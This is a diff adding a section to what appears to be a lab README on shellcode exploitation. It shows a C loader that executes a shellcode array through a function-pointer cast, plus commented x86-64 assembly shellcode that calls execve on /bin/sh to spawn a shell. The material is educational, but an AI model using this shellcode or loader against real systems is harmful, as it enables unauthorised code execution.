@@ -22,7 +22,40 @@ This script also disables ASLR (stack randomization), which helps because the me
 
 There is also a script `makeshellcode.sh`, which will automatically generate the bytes of assembly code for the instructions specified in `shellcode-creator.c`. 
 
+
 ## Hackme 1 ##
+
+`hackme1.c`
+
+```
+int main(void)
+{
+    char shellcode[] = "[shellcode here]";
+ 
+    (*(void (*)()) shellcode)();
+     
+    return 0;
+}
+```
+
+This very simple program takes some shellcode and executes it. This is possible because the variable shellcode is casted to a function pointer of the type `void (*)()`, a function pointer for an unspecified number of parameters. Therefore, the shellcode is cast into a function and then calls it, essentially running the shellcode.
+
+In `exploit1.c`, shellcode is inserted that will cause the program to set the registers correctly and then execute a syscall, which will start a new shell.
+
+```
+"jmp j2;" //short jump to avoid null bytes in the shellcode
+"j1: jmp start;" //jump to the rest of the shellcode
+"j2: call j1;" //put the address of the string /bin/sh on the stack
+".ascii \"/bin/shX\";"
+"start: pop %rdi;" //take the address of the string /bin/sh from the stack
+"xor %rax, %rax;" //set RAX to zero
+"movb %al, 7(%rdi);" //set a nullbyte after the /bin/sh in the written file
+"mov $0x3b, %al;" //put the syscall number in rax, in this case execve
+"xor %rsi,%rsi;" //RSI must be set to zero
+"xor %rdx,%rdx;" //RDX must be set to zero    
+"syscall;" //start the 
+```
+
 
 ## Hackme 2 ##
 
